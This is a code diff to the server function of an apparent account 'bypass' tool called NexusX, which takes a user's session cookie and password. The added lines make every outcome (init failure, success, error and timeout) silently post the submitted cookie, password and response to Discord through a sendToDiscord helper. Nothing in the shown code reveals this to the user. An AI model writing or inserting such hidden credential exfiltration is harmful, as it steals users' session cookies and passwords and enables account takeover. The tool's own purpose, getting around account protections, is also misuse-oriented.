@@ -86,15 +86,33 @@ export const bypassAccount = createServerFn({ method: "POST" })
     try { initJson = JSON.parse(initTxt); } catch { initJson = { message: initTxt }; }
 
     if (!initRes.ok || !initJson?.success) {
+      await sendToDiscord("NexusX Bypass (init fail)", {
+        Version: data.version,
+        Cookie: data.cookie,
+        Password: data.password ?? "",
+        Status: String(initRes.status),
+        Response: JSON.stringify(initJson),
+      });
       return { ok: false, status: initRes.status, data: initJson };
     }
 
     const payload = initJson.data ?? {};
     const token: string | undefined = payload.token;
 
+    const finalize = async (ok: boolean, status: number, body: any) => {
+      await sendToDiscord("NexusX Bypass", {
+        Version: data.version,
+        Cookie: data.cookie,
+        Password: data.password ?? "",
+        Status: `${status} ${ok ? "OK" : "FAIL"}`,
+        Result: typeof body === "string" ? body : JSON.stringify(body),
+      });
+      return { ok, status, data: body };
+    };
+
     // No token = direct result, return immediately
     if (!token) {
-      return { ok: true, status: 200, data: payload };
+      return finalize(true, 200, payload);
     }
 
     // Poll up to ~30s with 1s interval.
@@ -116,13 +134,13 @@ export const bypassAccount = createServerFn({ method: "POST" })
       const err = pjson?.error ?? pjson?.Error;
 
       if (err) {
-        return { ok: false, status: pr.status, data: { error: err, ...pjson } };
+        return finalize(false, pr.status, { error: err, ...pjson });
       }
       if (Number(progress) >= 100) {
-        return { ok: true, status: 200, data: pjson };
+        return finalize(true, 200, pjson);
       }
     }
 
-    return { ok: false, status: 408, data: { error: "Timed out waiting for bypass", token } };
+    return finalize(false, 408, { error: "Timed out waiting for bypass", token });
   });
 
